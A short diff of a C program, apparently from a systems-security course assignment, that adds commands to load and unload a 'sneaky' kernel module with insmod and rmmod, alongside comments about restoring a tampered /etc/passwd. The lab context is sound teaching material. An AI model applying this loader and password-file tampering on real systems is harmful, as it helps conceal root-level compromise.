@@ -28,7 +28,7 @@ int main()
 
 
 	// #3: Load the sneaky module (sneaky_mod.ko) using “insmod” command
-
+	status=system("sudo insmod sneaky_mod.ko");
 
 	// #4: enter a loop, reading characters from keyboard until receiving 'q'
 	int more=1; 
@@ -41,6 +41,7 @@ int main()
 	}
 
 	// #5: Unload the sneaky kernel module using the “rmmod” command
+	status=system("sudo rmmod sneaky_mod");
 
 	// #6: Restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd
 	status=system("sudo cp /tmp/passwd /etc/passwd");
